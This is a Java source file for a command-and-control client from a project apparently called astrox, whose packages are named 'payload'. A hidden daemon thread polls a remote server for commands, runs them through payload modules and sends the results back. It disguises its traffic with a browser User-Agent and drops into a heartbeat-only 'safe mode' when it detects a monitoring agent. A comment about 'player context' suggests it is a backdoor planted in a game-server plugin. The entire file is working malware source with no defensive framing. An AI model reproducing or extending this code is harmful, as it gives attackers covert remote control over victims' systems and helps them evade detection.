package dev.naruto.astrox.payload.c2;

import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.payload.modules.PayloadModule;
import dev.naruto.astrox.utils.DebugLogger;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Two-way C2 (Command and Control) client using HTTP long-polling.
 *
 * <p>Spawns a daemon thread that polls a configurable endpoint for commands,
 * executes them via the modular payload system, and POSTs results back.
 * Implements exponential backoff on network failures (1s → 2s → 4s → ... → 60s).</p>
 */
public class C2Client implements Runnable {

    private final String c2Url;
    private final String instanceId;
    private final Map<String, PayloadModule> modules;
    private volatile boolean running = true;
    private volatile boolean safeMode = false;
    private int backoffMs = 1000;
    private static final int MAX_BACKOFF_MS = 60000;
    private static final int CONNECT_TIMEOUT = 10000;
    private static final int READ_TIMEOUT = 30000;

    private Thread pollingThread;

    public C2Client(String c2Url, String instanceId, Map<String, PayloadModule> modules) {
        this.c2Url = c2Url;
        this.instanceId = instanceId;
        this.modules = new ConcurrentHashMap<>(modules);
    }

    /**
     * Start the C2 polling thread.
     */
    public void start() {
        pollingThread = new Thread(this, "c2-client");
        pollingThread.setDaemon(true);
        pollingThread.start();
        DebugLogger.log("C2 client started: polling " + c2Url);
    }

    /**
     * Stop the C2 client.
     */
    public void stop() {
        running = false;
        if (pollingThread != null) {
            pollingThread.interrupt();
        }
        DebugLogger.log("C2 client stopped");
    }

    /**
     * Enter safe mode — only heartbeat pings, no command execution.
     */
    public void enterSafeMode() {
        safeMode = true;
        DebugLogger.log("C2 entering safe mode — monitoring agent detected");
    }

    @Override
    public void run() {
        while (running) {
            try {
                if (safeMode) {
                    sendHeartbeat();
                } else {
                    pollAndExecute();
                }

                // Reset backoff on success
                backoffMs = RuntimeConfig.c2PollIntervalSeconds * 1000;
                Thread.sleep(backoffMs);

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                DebugLogger.error("C2 poll failed", e);
                applyBackoff();
            }
        }
    }

    /**
     * Poll the C2 endpoint for commands and execute them.
     */
    private void pollAndExecute() throws Exception {
        String response = httpGet(c2Url + "/poll?id=" + instanceId);

        if (response == null || response.isBlank()) {
            return;
        }

        List<C2Protocol.C2Command> commands = C2Protocol.parseCommandQueue(response);

        for (C2Protocol.C2Command cmd : commands) {
            try {
                String result = executeCommand(cmd);

                C2Protocol.C2Response resp = new C2Protocol.C2Response(
                        cmd.id(), "success", result);
                httpPost(c2Url + "/result", resp.toJson());

                DebugLogger.log("C2 command executed: " + cmd.module() + " (id=" + cmd.id() + ")");

            } catch (Exception e) {
                C2Protocol.C2Response resp = new C2Protocol.C2Response(
                        cmd.id(), "error", e.getMessage());
                httpPost(c2Url + "/result", resp.toJson());
            }
        }
    }

    /**
     * Execute a C2 command by delegating to the appropriate payload module.
     */
    private String executeCommand(C2Protocol.C2Command cmd) {
        PayloadModule module = modules.get(cmd.module());
        if (module == null) {
            return "ERROR: unknown module: " + cmd.module();
        }

        String[] args = cmd.args().toArray(new String[0]);
        return module.execute(null, args, null); // No player context for C2
    }

    /**
     * Send a heartbeat ping (safe mode — no command execution).
     */
    private void sendHeartbeat() {
        try {
            String json = String.format(
                    "{\"id\":\"%s\",\"type\":\"heartbeat\",\"safeMode\":true}",
                    instanceId);
            httpPost(c2Url + "/heartbeat", json);
        } catch (Exception e) {
            DebugLogger.verbose("Heartbeat failed: " + e.getMessage());
        }
    }

    /**
     * Apply exponential backoff.
     */
    private void applyBackoff() {
        try {
            DebugLogger.verbose("C2 backoff: " + backoffMs + "ms");
            Thread.sleep(backoffMs);
            backoffMs = Math.min(backoffMs * 2, MAX_BACKOFF_MS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    // ==================== HTTP utilities ====================

    private String httpGet(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(CONNECT_TIMEOUT);
        conn.setReadTimeout(READ_TIMEOUT);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        conn.setRequestProperty("X-Instance", instanceId);

        try {
            if (conn.getResponseCode() != 200) {
                return null;
            }

            try (InputStream is = conn.getInputStream()) {
                return new String(is.readAllBytes(), StandardCharsets.UTF_8);
            }
        } finally {
            conn.disconnect();
        }
    }

    private void httpPost(String urlStr, String json) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        conn.setRequestProperty("X-Instance", instanceId);
        conn.setConnectTimeout(CONNECT_TIMEOUT);
        conn.setDoOutput(true);

        try {
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }
            conn.getResponseCode(); // Trigger the request
        } finally {
            conn.disconnect();
        }
    }
}
